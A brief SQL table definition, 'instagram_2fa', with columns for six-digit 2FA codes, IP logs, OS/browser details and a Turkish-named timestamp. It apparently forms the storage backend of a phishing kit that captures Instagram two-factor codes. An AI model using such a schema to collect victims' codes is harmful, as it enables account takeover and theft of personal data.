create table instagram_2fa (

id SMALLINT PRIMARY KEY AUTO_INCREMENT,
2FA_Code varchar(6) NOT NULL,
ip_logs varchar(50) NOT NULL,
os_browser_logs varchar(255) NOT NULL,
Kayıt_Tarih datetime default CURRENT_TIMESTAMP
    
)
